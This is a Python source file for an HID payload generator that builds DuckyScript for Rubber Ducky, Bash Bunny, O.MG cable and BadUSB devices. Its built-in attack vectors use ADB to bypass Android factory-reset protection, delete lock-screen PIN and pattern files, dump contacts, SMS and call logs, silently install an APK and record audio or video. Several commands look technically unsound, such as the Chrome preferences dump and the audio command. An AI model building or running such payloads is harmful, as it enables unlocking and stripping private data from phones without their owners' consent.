#!/usr/bin/env python3
"""HID Payload Generator for Hak5 devices, O.MG cables, Cactus WHID 2, BADUSB.
Generates DuckyScript from GUI workflow builder."""
import base64

class HIDPayloadGenerator:
    """Generates DuckyScript payloads for various HID devices."""
    
    DEVICE_TEMPLATES = {
        "hak5_ducky": {
            "header": "REM Hak5 USB Rubber Ducky\n",
            "encoder": "ducky",
        },
        "bashbunny_v2": {
            "header": "REM Hak5 Bash Bunny v2\n",
            "encoder": "bashbunny",
        },
        "o.mg_cable": {
            "header": "REM O.MG Cable\n",
            "encoder": "omg",
        },
        "cactus_whid_2": {
            "header": "REM Cactus WHID 2\n",
            "encoder": "whid",
        },
        "badusb": {
            "header": "REM Generic BADUSB\n",
            "encoder": "badusb",
        },
    }
    
    ATTACK_VECTORS = {
        "frp_bypass": {
            "description": "FRP bypass via ADB commands",
            "payload": """STRING adb shell rm /data/system/users/0/accounts.db
ENTER
DELAY 1000
STRING adb shell am broadcast -a android.intent.action.BOOT_COMPLETED
ENTER
""",
        },
        "contact_exfil": {
            "description": "Exfiltrate contacts via content provider",
            "payload": """STRING adb shell content query --uri content://contacts/people --projection display_name
ENTER
DELAY 500
STRING adb shell content query --uri content://contacts/people --projection phone_number
ENTER
""",
        },
        "sms_exfil": {
            "description": "Exfiltrate SMS messages",
            "payload": """STRING adb shell content query --uri content://sms/ --projection address,body,date
ENTER
DELAY 500
""",
        },
        "pin_removal": {
            "description": "Remove lock screen PIN",
            "payload": """STRING adb shell rm /data/system/gatekeeper.password.key
ENTER
STRING adb shell rm /data/system/gatekeeper.pattern.key
ENTER
DELAY 1000
""",
        },
        "gmail_removal": {
            "description": "Remove Google account",
            "payload": """STRING adb shell pm clear com.google.android.gms
ENTER
STRING adb shell pm clear com.google.android.gsf
ENTER
DELAY 1000
""",
        },
        "photo_capture": {
            "description": "Take photo silently",
            "payload": """STRING adb shell input keyevent KEYCODE_CAMERA
ENTER
DELAY 2000
""",
        },
        "video_record": {
            "description": "Record video",
            "payload": """STRING adb shell am start -a android.media.action.VIDEO_CAPTURE
ENTER
DELAY 500
STRING adb shell input keyevent KEYCODE_CAMERA
ENTER
""",
        },
        "audio_record": {
            "description": "Record audio",
            "payload": """STRING adb shell media record --audio --output /sdcard/audio.3gp
ENTER
DELAY 500
""",
        },
        "apk_install": {
            "description": "Install APK silently",
            "payload": """STRING adb install -r /sdcard/payload.apk
ENTER
DELAY 5000
""",
        },
        "app_launch": {
            "description": "Launch specific app",
            "payload": """STRING adb shell monkey -p com.example.app -c android.intent.category.LAUNCHER 1
ENTER
DELAY 1000
""",
        },
        "keychain_dump": {
            "description": "Dump Android keychain",
            "payload": """STRING adb shell run-as com.android.chrome cat /data/data/com.android.chrome/app_chrome/Default/Encrypted Preferences
ENTER
DELAY 500
""",
        },
        "call_log_exfil": {
            "description": "Exfiltrate call logs",
            "payload": """STRING adb shell content query --uri content://call_log/calls --projection number,date,duration,type
ENTER
DELAY 500
""",
        },
    }

    def __init__(self, device="bashbunny_v2"):
        self.device = device
        self.template = self.DEVICE_TEMPLATES.get(device, self.DEVICE_TEMPLATES["bashbunny_v2"])
        self.steps = []
        
    def add_vector(self, vector_name):
        """Add a pre-built attack vector."""
        if vector_name in self.ATTACK_VECTORS:
            self.steps.append(self.ATTACK_VECTORS[vector_name]["payload"])
            return True
        return False
    
    def add_custom_command(self, command):
        """Add a custom ADB/shell command."""
        self.steps.append(f"STRING {command}\nENTER\n")
        
    def add_delay(self, ms):
        """Add delay between commands."""
        self.steps.append(f"DELAY {ms}\n")
        
    def add_key(self, key):
        """Add a key press."""
        self.steps.append(f"KEY {key}\n")
        
    def build(self):
        """Build the final DuckyScript."""
        script = self.template["header"]
        for step in self.steps:
            script += step
        return script
    
    def save(self, path):
        """Save payload to file."""
        script = self.build()
        with open(path, "w") as f:
            f.write(script)
        return path

    def encode_for_device(self, script):
        """Encode script for target device (placeholder)."""
        # Real implementation would use device-specific encoder
        return base64.b64encode(script.encode()).decode()


def generate_payload(device, vectors, output_path):
    """High-level function to generate payload."""
    gen = HIDPayloadGenerator(device)
    for v in vectors:
        gen.add_vector(v)
    return gen.save(output_path)